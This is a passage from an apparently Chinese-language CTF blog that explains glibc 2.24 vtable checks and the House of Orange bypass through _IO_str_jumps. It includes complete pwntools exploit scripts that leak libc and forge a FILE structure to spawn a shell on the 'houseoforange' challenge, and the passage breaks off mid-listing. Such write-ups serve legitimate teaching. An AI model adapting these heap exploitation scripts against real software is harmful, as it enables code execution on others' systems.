log.success(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line">	_IO_list_all = libc_base + libc.symbols[<span class="string">&apos;_IO_list_all&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;_IO_list_all:&apos;</span> + hex(_IO_list_all))</span><br><span class="line">	_IO_str_jumps = libc_base + libc.symbols[<span class="string">&apos;_IO_str_jumps&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;_IO_str_jumps: &apos;</span>+hex(_IO_str_jumps))</span><br><span class="line">	system = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system: &apos;</span>+hex(system))</span><br><span class="line">	binsh = libc_base+libc.search(<span class="string">&apos;/bin/sh\x00&apos;</span>).next()</span><br><span class="line">	log.success(<span class="string">&apos;binsh: &apos;</span>+hex(binsh))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x10</span></span><br><span class="line">	fake_file = p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(binsh)</span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">	fake_file += p64(_IO_str_jumps<span class="number">-0x8</span>)</span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xe8</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	payload += fake_file</span><br><span class="line">	payload += p64(system)	</span><br><span class="line">	add(<span class="number">0x10</span>,payload)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Choice&gt;&gt;&apos;</span>)</span><br><span class="line">  p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&apos;Size:&apos;</span>)</span><br><span class="line">  p.sendline(str(<span class="number">0x10</span>))</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/29/House-of-Orange在2-24glibc下的利用/">House_of_Orange在2.24glibc下的利用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-29</time><div class="content"><h2 id="0x01-2-24-glibc&#x5173;&#x4E8E;vtable&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;"><a href="#0x01-2-24-glibc&#x5173;&#x4E8E;vtable&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;" class="headerlink" title="0x01 2.24 glibc&#x5173;&#x4E8E;vtable&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;"></a>0x01 2.24 glibc&#x5173;&#x4E8E;vtable&#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;</h2><p>&#x5728;2.24&#x7248;&#x672C;&#x7684;glibc&#x4E2D;&#xFF0C;&#x52A0;&#x5165;&#x4E86;&#x5BF9; vtable &#x7684;&#x5B89;&#x5168;&#x68C0;&#x6D4B;&#xFF0C;glibc &#x4F1A;&#x5728;&#x8C03;&#x7528;&#x865A;&#x51FD;&#x6570;&#x4E4B;&#x524D;&#x5728;<code>IO_validate_vtable</code>&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x9996;&#x5148;&#x68C0;&#x67E5; vtable &#x5730;&#x5740;&#x7684;&#x5408;&#x6CD5;&#x6027;&#xFF0C;&#x4E3B;&#x8981;&#x9A8C;&#x8BC1;&#x65B9;&#x6CD5;&#x662F;&#x6839;&#x636E;&#x504F;&#x79FB;&#x5224;&#x65AD; vtable &#x662F;&#x5426;&#x4F4D;&#x4E8E;<code>_IO_vtable</code> &#x6BB5;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x4F1A;&#x8C03;&#x7528;&#x51FD;&#x6570; <code>_IO_vtable_check</code>&#x8FDB;&#x4E00;&#x6B65;&#x68C0;&#x6D4B;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IO_validate_vtable (<span class="keyword">const</span> struct _IO_jump_t *vtable)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;	<span class="comment">//&#x8BA1;&#x7B97;_IO_vtable&#x6BB5;&#x7684;&#x957F;&#x5EA6;</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;	<span class="comment">//&#x8BA1;&#x7B97;&#x865A;&#x8868;&#x5730;&#x5740;&#x76F8;&#x5BF9;&#x6BB5;&#x9996;&#x7684;&#x504F;&#x79FB;</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))	<span class="comment">//&#x504F;&#x79FB;&#x5927;&#x4E8E;&#x6BB5;&#x957F;</span></span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();	<span class="comment">//&#x8C03;&#x7528;_IO_vtable_check ()&#x8FDB;&#x4E00;&#x6B65;&#x68C0;&#x6D4B;</span></span><br><span class="line">  <span class="keyword">return</span> vtable;	<span class="comment">//&#x68C0;&#x6D4B;&#x6B63;&#x5E38;&#x5219;&#x8FD4;&#x56DE;&#x865A;&#x8868;</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x5F53;&#x68C0;&#x6D4B;&#x865A;&#x8868;&#x7684;&#x504F;&#x79FB;&#x5927;&#x4E8E;<code>_IO_vtable</code> &#x6BB5;&#x957F;&#x65F6;&#x5C31;&#x4F1A;&#x8C03;&#x7528;<code>_IO_vtable_check()</code>&#x505A;&#x8FDB;&#x4E00;&#x6B65;&#x68C0;&#x6D4B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  {</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h2 id="0x02-&#x5229;&#x7528;-IO-file-jumps-&#x865A;&#x8868;&#x4E2D;&#x7684;-IO-str-finish-&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;"><a href="#0x02-&#x5229;&#x7528;-IO-file-jumps-&#x865A;&#x8868;&#x4E2D;&#x7684;-IO-str-finish-&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;" class="headerlink" title="0x02 &#x5229;&#x7528; _IO_file_jumps &#x865A;&#x8868;&#x4E2D;&#x7684; _IO_str_finish &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;"></a>0x02 &#x5229;&#x7528; _IO_file_jumps &#x865A;&#x8868;&#x4E2D;&#x7684; _IO_str_finish &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5229;&#x7528;</h2><p>_IO_str_jumps &#x7684;&#x7ED3;&#x6784;&#x5982;&#x4E0B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">p _IO_str_jumps</span><br><span class="line">$<span class="number">4</span> = {</span><br><span class="line">  __dummy = <span class="number">0x0</span>, </span><br><span class="line">  __dummy2 = <span class="number">0x0</span>, </span><br><span class="line">  __finish = <span class="number">0x7f1ab46f5fa0</span> &lt;_IO_str_finish&gt;, </span><br><span class="line">  __overflow = <span class="number">0x7f1ab46f5c80</span> &lt;__GI__IO_str_overflow&gt;, </span><br><span class="line">  __underflow = <span class="number">0x7f1ab46f5c20</span> &lt;__GI__IO_str_underflow&gt;, </span><br><span class="line">  __uflow = <span class="number">0x7f1ab46f4600</span> &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = <span class="number">0x7f1ab46f5f80</span> &lt;__GI__IO_str_pbackfail&gt;, </span><br><span class="line">  __xsputn = <span class="number">0x7f1ab46f4630</span> &lt;__GI__IO_default_xsputn&gt;, </span><br><span class="line">  __xsgetn = <span class="number">0x7f1ab46f4710</span> &lt;__GI__IO_default_xsgetn&gt;, </span><br><span class="line">  __seekoff = <span class="number">0x7f1ab46f60d0</span> &lt;__GI__IO_str_seekoff&gt;, </span><br><span class="line">  __seekpos = <span class="number">0x7f1ab46f4a00</span> &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = <span class="number">0x7f1ab46f4930</span> &lt;_IO_default_setbuf&gt;, </span><br><span class="line">  __sync = <span class="number">0x7f1ab46f4c00</span> &lt;_IO_default_sync&gt;, </span><br><span class="line">  __doallocate = <span class="number">0x7f1ab46f4a20</span> &lt;__GI__IO_default_doallocate&gt;, </span><br><span class="line">  __read = <span class="number">0x7f1ab46f5ad0</span> &lt;_IO_default_read&gt;, </span><br><span class="line">  __write = <span class="number">0x7f1ab46f5ae0</span> &lt;_IO_default_write&gt;, </span><br><span class="line">  __seek = <span class="number">0x7f1ab46f5ab0</span> &lt;_IO_default_seek&gt;, </span><br><span class="line">  __close = <span class="number">0x7f1ab46f4c00</span> &lt;_IO_default_sync&gt;, </span><br><span class="line">  __stat = <span class="number">0x7f1ab46f5ac0</span> &lt;_IO_default_stat&gt;, </span><br><span class="line">  __showmanyc = <span class="number">0x7f1ab46f5af0</span> &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = <span class="number">0x7f1ab46f5b00</span> &lt;_IO_default_imbue&gt;</span><br></pre></td></tr></table></figure>
<h3 id="&#x4E3A;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x51FD;&#x6570;-IO-str-finish-&#x83B7;&#x5F97;shell"><a href="#&#x4E3A;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x51FD;&#x6570;-IO-str-finish-&#x83B7;&#x5F97;shell" class="headerlink" title="&#x4E3A;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x51FD;&#x6570; _IO_str_finish &#x83B7;&#x5F97;shell"></a>&#x4E3A;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x51FD;&#x6570; _IO_str_finish &#x83B7;&#x5F97;shell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) <span class="comment">//&#x6761;&#x4EF6;</span></span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);<span class="comment">// [fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x5730;&#x5740;fp+0xe8&#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x6307;&#x9488;&#xFF0C;&#x51FD;&#x6570;<code>_IO_str_finish</code>&#x4F1A;&#x8C03;&#x7528;&#x5176;&#x6307;&#x5411;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x53C2;&#x6570;&#x662F;<code>_IO_buf_base</code>&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5C06;<code>_IO_buf_base</code>&#x4FEE;&#x6539;&#x4E3A;&#x201D;/bin/sh&#x201D;&#xFF0C;&#x63A5;&#x7740;&#x5728;fp+0xe8&#x5904;&#x5199;&#x5165;system&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x83B7;&#x5F97;shell</p>
<p>&#x62A5;&#x9519;&#x65F6;&#xFF0C;glibc&#x4E0D;&#x4F1A;&#x4E3B;&#x52A8;&#x8C03;&#x7528;<code>_IO_str_finish</code>&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5728;&#x5229;&#x7528;&#x65F6;&#x5C06;vtable&#x7684;&#x5730;&#x5740;&#x51CF;&#x5C0F;&#x4E86;<code>0x8</code>&#x8FD9;&#x6837;&#x7A0B;&#x5E8F;&#x62A5;&#x9519;&#x65F6;&#x8C03;&#x7528;<code>_IO_str_overflow</code>&#x865A;&#x8868;&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x5176;&#x5B9E;&#x8C03;&#x7528;&#x7684;&#x662F;<code>_IO_str_finish</code>&#x51FD;&#x6570;</p>
<p>&#x518D;&#x52A0;&#x4E0A;<code>_IO_flush_all_lockp</code>&#x4E2D;&#x89E6;&#x53D1;<code>OVERFLOW</code>&#x7684;&#x6761;&#x4EF6;</p>
<p>&#x6761;&#x4EF6;&#x4E3A;</p>
<ul>
<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
<li>fp-&gt;_mode &lt;= 0</li>
<li>fp-&gt;_IO_buf_base &#x4E3A;&#x771F;</li>
<li>!(fp-&gt;_flags &amp; _IO_USER_BUF) &#x4E3A;&#x771F;</li>
</ul>
<p>&#x603B;&#x7ED3;&#x5229;&#x7528;&#x6761;&#x4EF6;&#x4E3A;</p>
<ul>
<li>fp-&gt;_IO_write_ptr =1</li>
<li>fp-&gt;_IO_write_base =0</li>
<li>fp-&gt;_mode = 0</li>
<li>_IO_buf_base&#x5199;&#x5165;&#x201D;/bin/sh&#x201D;&#x7684;&#x5730;&#x5740;</li>
<li>fp-&gt;_flags = 0</li>
</ul>
<p>exp&#x5982;&#x4E0B;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&apos;/opt/glibc-2.24/lib/ld-linux-x86-64.so.2&apos;</span>,<span class="string">&apos;--library-path&apos;</span>,<span class="string">&apos;/opt/glibc-2.24/lib/&apos;</span>,<span class="string">&apos;./houseoforange&apos;</span>])</span><br><span class="line">elf = ELF(<span class="string">&apos;./houseoforange&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;/opt/glibc-2.24/lib/libc-2.24.so&apos;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	raw_input(a)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name :&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice :&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Length of name :&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Name:&apos;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Price of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Color of Orange: &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Finish&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#step1. alter the top chunk&apos;s size</span></span><br><span class="line">	build(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfa1</span>)</span><br><span class="line">	upgrade(<span class="number">0x100</span>,payload)</span><br><span class="line">	build(<span class="number">0x1000</span>,<span class="string">&apos;cccccccc&apos;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#step2. leak the address of libc</span></span><br><span class="line">	build(<span class="number">0x400</span>,<span class="string">&apos;aaaaaaaa&apos;</span>)	<span class="comment">#chunk*</span></span><br><span class="line">	see()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;a&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	addr = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	libc_base = addr - <span class="number">1640</span> - <span class="number">0x398b00</span></span><br><span class="line">	log.success(<span class="string">&apos;libc_base:&apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#step3. calc the addr</span></span><br><span class="line">	binsh_addr = libc_base + next(libc.search(<span class="string">&apos;/bin/sh\x00&apos;</span>))</span><br><span class="line">	log.success(<span class="string">&apos;binsh_addr: &apos;</span>+hex(binsh_addr))</span><br><span class="line">	_IO_list_all_addr = libc_base+libc.symbols[<span class="string">&apos;_IO_list_all&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;_IO_list_all_addr: &apos;</span>+hex(_IO_list_all_addr))</span><br><span class="line">	_IO_str_jumps = libc_base + libc.symbols[<span class="string">&apos;_IO_str_jumps&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;_IO_str_jumps:&apos;</span>+hex(_IO_str_jumps))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">0x400</span></span><br><span class="line">	payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>)+p64(<span class="number">0</span>)	</span><br><span class="line"></span><br><span class="line">	fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr<span class="number">-0x10</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)	</span><br><span class="line">	fake_file += p64(binsh_addr)	<span class="comment">#_IO_buf_base</span></span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>) <span class="comment">#mode&lt;=0</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(<span class="number">0</span>)</span><br><span class="line">	fake_file += p64(_IO_str_jumps<span class="number">-0x8</span>)<span class="comment">#pointer to vtable</span></span><br><span class="line">	fake_file = fake_file.ljust(<span class="number">0xe8</span>,<span class="string">&apos;\x00&apos;</span>)</span><br><span class="line">	fake_file += p64(system_addr)</span><br><span class="line">	payload += fake_file</span><br><span class="line"></span><br><span class="line">	upgrade(<span class="number">0x800</span>,payload)	</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Your choice : &apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<p>&#x4F7F;&#x7528;&#x6A21;&#x5757;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 